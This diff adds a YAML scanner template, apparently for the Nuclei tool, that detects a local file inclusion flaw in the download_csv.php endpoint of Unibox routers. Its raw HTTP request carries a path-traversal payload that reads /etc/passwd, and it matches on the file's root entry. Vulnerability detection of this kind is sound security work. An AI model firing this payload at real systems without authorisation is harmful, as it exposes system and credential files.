@@ -1,0 +1,27 @@
+id: unibox-download-csv-lfi
+
+info:
+  name: Unibox download_csv.php - Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a local file inclusion vulnerability in the `download_csv.php` endpoint of Unibox routers. The endpoint allows downloading files without proper input validation.
+  tags: Unibox
+
+http:
+  - raw:
+      - |
+        GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+        part: body
+      - type: status
+        status:
+          - 200
